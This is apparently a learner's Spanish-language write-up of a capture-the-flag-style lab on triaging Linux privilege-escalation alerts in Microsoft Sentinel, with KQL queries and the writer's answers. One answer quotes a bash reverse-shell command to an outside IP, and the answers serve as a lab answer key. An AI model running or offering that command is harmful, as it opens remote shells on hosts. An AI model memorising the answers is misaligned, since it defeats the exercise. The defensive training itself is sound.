
  
Introduction

![[Pasted image 20251210160127.png]]

El Centro de Operaciones de Seguridad de Best Festival Company estaba sumido en el caos. Las pantallas parpadearon, las luces destellaron y el sonido de las alertas resonó en la habitación como una tormenta digital. Los elfos corrieron entre las consolas, con sus rostros iluminados por el brillo de las advertencias rojas y naranjas. Había alertas de lluvia y nadie sabía dónde había comenzado la tormenta.

Los susurros se extendieron por el SOC mientras la tensión llenaba el aire. Algo extraño estaba sucediendo en el entorno de la nube y el momento no podría ser peor. A medida que la tormenta de alertas se hacía más intensa, un nombre surgió entre los preocupados elfos: los malvados Conejos de Pascua. ¿Pero por qué ahora? ¿Y qué buscaban esta vez?

Objetivos de aprendizaje

- Comprender la importancia de la clasificación y priorización de alertas
- Explore Microsoft Sentinel para revisar y analizar alertas
- Correlacione registros para identificar actividades reales y determinar veredictos de alerta

Siga las instrucciones a continuación para acceder a su laboratorio para realizar la tarea.

Para comenzar, haga clic en el botón Detalles de la nube a continuación.

En caso de que el laboratorio no se cargue y produzca un error debido a grandes volúmenes en Azure, espere 30 minutos antes de volver a intentarlo.

Detalles de la nube

En la pestaña Entorno, haga clic en el botón Unirse al laboratorio para implementar su entorno de laboratorio.

![[Pasted image 20251210160152.png]]

Después de unirse al laboratorio, seleccione la pestaña Acciones. Desde aquí, primero haga clic en (1) Implementar laboratorio. Espere de 2 a 3 minutos antes de proceder a hacer clic en el botón (2) Implementar reglas para asegurarse de que su entorno esté configurado correctamente.

![[Pasted image 20251210160239.png]]

Luego, haga clic en el botón Copiar URL del laboratorio para copiar la URL del portal de Azure y abrirla en una nueva pestaña.

![[Pasted image 20251210160305.png]]

A continuación, seleccione la pestaña Credenciales para ver sus credenciales de inicio de sesión para acceder al portal de Microsoft Azure.

![[Pasted image 20251210160332.png]]

Inicie sesión con su nombre de usuario y Pase de acceso temporal (TAP) desde la pestaña Credenciales. Luego haga clic en Siguiente para continuar. Esto lo llevará directamente al portal de Microsoft Azure.

![[Pasted image 20251210160356.png]]

![[Pasted image 20251210160405.png]]

Nota: El proceso de implementación completo después de presionar Implementar laboratorio e Implementar reglas demora entre 4 y 5 minutos. Asegúrate de darle suficiente tiempo. Además, el acceso al laboratorio caducará después de 1 hora.

En una nota rápida, el contenido del modal Detalles de la nube será visible en la parte superior de la sala una vez que se implemente el laboratorio. Esto le permite acceder fácilmente a todos sus datos y controlar el laboratorio.

![[Pasted image 20251210160428.png]]

  
**Answer the questions below**

I have successfully deployed the lab and its rules, and I'm now ready to access my Azure account!

No answer needed


---

# ==Alert Triaging Primer==

## Está lloviendo alertas

McSkidy recibió alertas de que está lloviendo; Algo inusual está sucediendo dentro del inquilino de Azure. Los tableros se iluminan con actividades sospechosas y las primeras señales indican un posible ataque de los Evil Bunnies. The Best Festival Company debe actuar rápido para sobrevivir a este ataque antes de que afecte las operaciones de toda la temporada.

![[Pasted image 20251210160615.png]]

Antes de investigar estas alertas en Microsoft Sentinel, McSkidy debe dar un paso atrás y comprender lo que está sucediendo. Cuando las alertas comienzan a llegar, saltar directamente a cada una no es eficiente, ya que no todas las alertas son iguales. Algunos son ruido, otros son falsos positivos y algunos pueden indicar amenazas reales en progreso.

Aquí es donde la clasificación de alertas se vuelve crítica. La clasificación ayuda a los equipos de seguridad a identificar qué alertas merecen atención inmediata, cuáles se pueden quitar prioridad y cuáles se pueden ignorar de forma segura por un momento. El proceso separa el caos de la claridad, lo que permite a analistas como el equipo SOC de McSkidy centrar su tiempo y recursos en lo que realmente importa.

## Clasificación de alertas

Ahora, continuemos la discusión sobre la clasificación de alertas. En la sección anterior, presentamos el triage y por qué es esencial. Esta vez, nos centraremos en cómo abordarlo, qué priorizar, qué buscar y qué hacer inmediatamente después de una alerta.

Cuando aparecen varias alertas, los analistas deben tener un método coherente para evaluarlas y priorizarlas rápidamente. Hay muchos factores que puede considerar al realizar la clasificación, pero estos son los fundamentales que siempre deben formar parte de su proceso de identificación y evaluación de alertas:

|                         |                                                                                                                           |                                                                                                      |
| ----------------------- | ------------------------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------- |
| **Key Factors**         | **Description**                                                                                                           | **Why It Matters?**                                                                                  |
| Severity Level          | Revise la clasificación de gravedad de la alerta, desde Informativa hasta Crítica.                                        | Indica la urgencia de la respuesta y el riesgo comercial potencial.                                  |
| Timestamp and Frequency | Identifique cuándo se activó la alerta y verifique la actividad relacionada antes y después de ese momento.               | Ayuda a identificar ataques en curso o patrones de comportamiento repetido.                          |
| Attack Stage            | Determine qué etapa del ciclo de vida del ataque indica esta alerta (reconocimiento, persistencia o filtración de datos). | Da una idea de hasta dónde puede haber progresado el atacante y su objetivo.                         |
| Affected Asset          | Identifique el sistema, usuario o recurso involucrado y evalúe su importancia para las operaciones.                       | Prioriza la respuesta en función de la importancia del activo y el impacto potencial del compromiso. |

En resumen, estas cuatro representan las dimensiones esenciales del triage:

- Gravedad: ¿Qué tan grave?
- Hora: ¿Cuándo?
- Contexto: ¿En qué parte del ciclo de vida del ataque?
- Impacto: ¿Quién o qué se ve afectado?

Forman una base equilibrada que es lo suficientemente simple para que los analistas la apliquen rápidamente pero lo suficientemente completa para tomar decisiones informadas.

Después de revisar estos factores, decida su próximo paso: escalar al equipo de respuesta a incidentes, realizar una investigación más profunda o cerrar la alerta si se confirma que es un falso positivo. Un proceso de clasificación estructurado como este ayuda a garantizar que el tiempo y los recursos se centren en lo que realmente importa.

## Profundizando en una alerta

Después de identificar qué alertas merecen mayor atención, es hora de profundizar en los detalles. Siga estos pasos para investigar y correlacionar eficazmente:

- **Investigue la alerta en detalle:** Abra la alerta y revise las entidades, los datos del evento y la lógica de detección. Confirme si la actividad representa un comportamiento malicioso real.

- **Consulte los registros relacionados:** Examine las fuentes de registro relevantes. Busque patrones o acciones inusuales que se alineen con la alerta.

- **Correlacione múltiples alertas:** Identifique otras alertas que involucren al mismo usuario, dirección IP o dispositivo. La correlación a menudo revela una secuencia de ataque más amplia o una actividad coordinada.

- **Construya un contexto y una línea de tiempo:** Combine marcas de tiempo, acciones de usuarios y activos afectados para reconstruir la secuencia de eventos. Esto ayuda a determinar si el ataque está en curso o ya ha sido contenido.

- **Decide la siguiente acción**: Si hay indicadores de compromiso, escale al equipo de respuesta a incidentes. Investigue más a fondo si se necesita más evidencia o correlación. Cierre o suprima si la alerta es un falso positivo confirmado y actualice las reglas de detección en consecuencia.

- **Documentar los hallazgos y las lecciones aprendidas:** Mantenga un registro claro del análisis, las decisiones y los pasos de remediación. La documentación adecuada fortalece los procesos SOC y respalda la mejora continua.

Con la clasificación completa y la investigación en marcha, McSkidy comienza a armar el rompecabezas. Cada alerta, entrada de registro y marca de tiempo la acerca a descubrir qué están haciendo los Evil Bunnies dentro del inquilino de Azure. Es hora de conectar los puntos y revelar el panorama más amplio detrás del ruido.

Answer the questions below

Let's proceed to the action!

No answer needed

---

# ==Environment Setup==

## Configuración del entorno

Antes de continuar con la clasificación de alertas, primero configuremos el entorno de su laboratorio. Este paso garantiza que todas las alertas simuladas estén listas en su entorno de Azure.

Para comenzar, diríjase al Portal de Azure y busque Microsoft Sentinel.

![[Pasted image 20251210164916.png]]

Luego, haga clic en su instancia de Sentinel dedicada, vaya a la pestaña Registros y seleccione la tabla de registro personalizada denominada Syslog_CL.

![[Pasted image 20251210164941.png]]

Después de ejecutar la consulta, se deben representar los registros de este entorno de laboratorio.

![[Pasted image 20251210165009.png]]

Nota: Es posible que los registros tarden algunos minutos en incorporarse por completo. Espere antes de continuar con el siguiente paso. Puede hacer clic en el botón Actualizar para ver la tabla actualizada.

## Preparando las reglas centinela

Después de revisar los registros, navegue hasta la pestaña Configuración y seleccione Análisis, como se muestra en la imagen a continuación.

![[Pasted image 20251210165050.png]]

A partir de aquí, nuestro objetivo es volver a habilitar el conjunto de reglas implementado y obligarlo a activar las alertas, produciendo así los incidentes. A partir de la pestaña Análisis, seleccione todas las reglas activas y haga clic en Desactivar. Una vez que las reglas estén deshabilitadas, selecciónelas nuevamente y haga clic en Habilitar.

Nota: actualice la página si encuentra el mensaje "Esta página se ha movido al portal de Defender". Tenga esto en cuenta cada vez que encuentre ese mensaje.

Después de realizar estos pasos, recibirá una notificación indicando que ha vuelto a habilitar las reglas con éxito.

![[Pasted image 20251210165112.png]]

Ahora que hemos preparado el entorno, procedamos con la discusión sobre la clasificación de alertas en la siguiente tarea.


---

## ==Investigation Proper==

## McSkidy va a clasificar

Ahora que hemos aprendido sobre la clasificación, pasemos a la parte divertida: trabajar dentro del entorno SOC real de Best Festival Company alojado en Azure. Aquí es donde McSkidy pondrá a prueba sus habilidades de clasificación utilizando Microsoft Sentinel, una plataforma SIEM y SOAR nativa de la nube. Sentinel recopila datos de varios servicios, aplicaciones y fuentes conectadas de Azure para detectar, investigar y responder a amenazas en tiempo real.

A través de Sentinel, McSkidy puede ver y administrar alertas, analizar incidentes y correlacionar actividades en múltiples registros. Proporciona visibilidad de lo que sucede dentro del inquilino de Azure y permite a los analistas pasar de una alerta a otra de manera eficiente. En la siguiente parte, exploraremos cómo McSkidy revisa las alertas, profundiza en la evidencia y utiliza las herramientas de investigación de Sentinel para descubrir la verdad detrás del ataque de los Evil Bunnies.

## Microsoft Sentinel en acción

Para iniciar la actividad, navegue hasta Microsoft Sentinel y seleccione su instancia de Sentinel dedicada. Luego, en el menú desplegable Gestión de amenazas, seleccione la pestaña Incidentes para ver los incidentes desencadenados durante el período de tiempo actual. También puede presionar el botón << para expandir la vista como se muestra en la imagen a continuación.

![[Pasted image 20251210165251.png]]

Nota: Inicialmente hemos precargado las reglas de los pasos anteriores. En algunos casos, es posible que las alertas aún no se hayan activado. Pero no se preocupe, rehaga el paso de habilitar/deshabilitar reglas para activarlas.

De las imágenes de la tarea, se desprenden ocho incidentes abiertos, cuatro de gravedad alta y cuatro de gravedad media. Tenga en cuenta que estos números pueden diferir en el entorno de su laboratorio.

Dado que nos centramos en abordar primero las amenazas más críticas, comenzaremos con las alertas de alta gravedad. Estos representan posibles puntos de compromiso o actividades de escalada de privilegios que podrían conducir a un control total del host si no se controlan.

Para comenzar la clasificación, examinaremos en detalle un incidente de alta gravedad: la alerta de inserción del módulo del kernel de Linux PrivEsc. Al hacer clic en la alerta, aparecen detalles adicionales en el lado derecho.

![[Pasted image 20251210170958.png]]

Al verificar la alerta, como se ve en la imagen de arriba, se pueden inferir inicialmente los siguientes detalles:

1. Hay tres eventos relacionados con la alerta.
2. La alerta se creó recientemente (tenga en cuenta que esto varía según su instancia de laboratorio).
3. Hay tres entidades involucradas en la alerta.
4. La alerta está clasificada como una táctica de escalada de privilegios.

Podemos obtener más detalles desde aquí haciendo clic en el botón Ver detalles completos.

![[Pasted image 20251210171053.png]]

En la nueva vista, podemos ver que además de los detalles que se muestran en el resumen, también podemos ver la posible línea de tiempo del incidente e incidentes similares.

![[Pasted image 20251210171116.png]]

## Comprender las alertas relacionadas

En la vista anterior, puede observar que varias alertas apuntan a las mismas entidades afectadas. Esto nos ayuda a comprender la relación y la posible secuencia de eventos que impactan al mismo host o usuario.

Cuando se vinculan varias alertas a una sola entidad, como la misma máquina, usuario o dirección IP, generalmente indica que estas detecciones no son incidentes aislados, sino etapas algo diferentes de la misma intrusión.

Al analizar qué alertas comparten las mismas entidades, podemos comenzar a rastrear la ruta del ataque, desde el acceso inicial hasta la escalada de privilegios y la persistencia.

Por ejemplo, si la misma VM activó las siguientes alertas:

|                                 |                                                                                |
| ------------------------------- | ------------------------------------------------------------------------------ |
| **Alert**                       | **What does it suggest?**                                                      |
| Root SSH Login from External IP | El atacante obtuvo acceso remoto (a través de SSH) al sistema (Acceso Inicial) |
| SUID Discovery                  | El atacante buscó formas de escalar privilegios.                               |
| Kernel Module Insertion         | El atacante instaló un módulo de kernel malicioso para lograr persistencia.    |

En esta etapa, McSkidy revisó las alertas de alta gravedad, identificó las entidades afectadas y notó que varias detecciones están vinculadas entre sí. Esta clasificación inicial le permite priorizar qué incidentes necesitan atención inmediata y reconocer cuándo múltiples alertas son en realidad parte de un compromiso mayor.

Con esta comprensión fundamental, McSkidy está listo para ir más allá de la clasificación a nivel de superficie y profundizar en los registros subyacentes, que se analizarán en la siguiente tarea.

**Answer the questions below**

How many entities are affected by the **Linux PrivEsc - Polkit Exploit Attempt** alert?

Respuesta: 10
![[Pasted image 20251216152158.png]]

What is the severity of the **Linux PrivEsc - Sudo Shadow Access** alert?

Respuesta: High
![[Pasted image 20251216152257.png]]

How many accounts were added to the sudoers group in the **Linux PrivEsc - User Added to Sudo Group** alert?

Respuesta: 4
![[Pasted image 20251216152545.png]]
![[Pasted image 20251216152823.png]]

personalizamos la busqueda en incidentes
![[Pasted image 20251216151330.png]]

---

## ==Diving Deeper Into Logs==

## Análisis de registros en profundidad con Sentinel

Una vez completada la clasificación inicial, McSkidy ahora examina la evidencia cruda detrás de estas alertas. La siguiente tarea implica profundizar en los datos de registro subyacentes dentro de Microsoft Sentinel para validar las alertas y descubrir las acciones exactas del atacante que las desencadenaron. Al analizar los intentos de autenticación, las ejecuciones de comandos y los cambios en el sistema, McSkidy puede comenzar a reconstruir la historia completa de cómo se desarrolló el ataque.

Si volvemos a la vista de detalles completos de la alerta, podemos intentar hacer clic en Eventos en la sección Evidencia.

![[Pasted image 20251210171410.png]]

Desde esta vista, definitivamente podemos ver el nombre real del módulo del kernel instalado en cada máquina y la hora en que se instaló.

Profundizando en esto, podemos intentar verificar los eventos sin procesar de un solo host a través de una consulta personalizada. Para hacer esto, cambiemos la vista a una consulta KQL editable y busquemos todos los eventos activados desde la aplicación-02.

1. Presione el menú desplegable Modo simple en la esquina superior derecha y seleccione el modo KQL.
2. Modifique la consulta con la siguiente consulta KQL a continuación.

``set query_now = datatime (2025-10-30T05:09:25.9886229Z);``
``Syslog_CL``
``| where host_s == 'aplicación-02'``
``| project _timestamp_t, host_s, Message``

3. Presione el botón Ejecutar y espere los resultados.

![[Pasted image 20251210171632.png]]

Después de ejecutar la consulta, se puede ver que ocurrieron múltiples eventos potencialmente sospechosos alrededor de la instalación del módulo del kernel.

1. Ejecución del comando cp (copiar) para crear una copia de seguridad del archivo oculto.
2. Adición de la cuenta de usuario Alice al grupo sudoers.
3. Modificación de la cuenta de usuario de respaldo por root.
4. Inserción del módulo malicioso_mod.ko.
5. Autenticación SSH exitosa por parte del usuario root.

![[Pasted image 20251210171703.png]]

Según los eventos circundantes, incluida la ejecución del comando cp para crear una copia de seguridad del archivo oculto, la adición de la cuenta de usuario Alice al grupo sudoers, la modificación de la cuenta del usuario de copia de seguridad por parte del usuario raíz y la autenticación SSH exitosa por parte del usuario raíz, esta actividad parece muy inusual. La secuencia sugiere una posible escalada de privilegios y un comportamiento de persistencia, lo que indica que el evento puede no ser parte de las operaciones normales del sistema y justifica una mayor investigación.

Ahora que hemos analizado la metodología para determinar y revisar las alertas, ayudemos a McSkidy a completar la evaluación examinando las alertas restantes y respondiendo las preguntas a continuación.

![[Pasted image 20251210171728.png]]

  
**Answer the questions below**

What is the name of the kernel module installed in websrv-01?

Respuesta:  malicious_mod.ko
![[Pasted image 20251216164710.png]]

What is the unusual command executed within websrv-01 by the ops user?

Respuesta: /bin/bash -i >& /dev/tcp/198.51.100.22/4444 0>&1
![[Pasted image 20251216165045.png]]

What is the source IP address of the first successful SSH login to storage-01?

Respuesta: 172.16.0.12
![[Pasted image 20251216165345.png]]

What is the external source IP that successfully logged in as root to app-01?

Respuesta: 
![[Pasted image 20251216165558.png]]

Aside from the backup user, what is the name of the user added to the sudoers group inside app-01?

Respuesta:  deploy
![[Pasted image 20251216170317.png]]

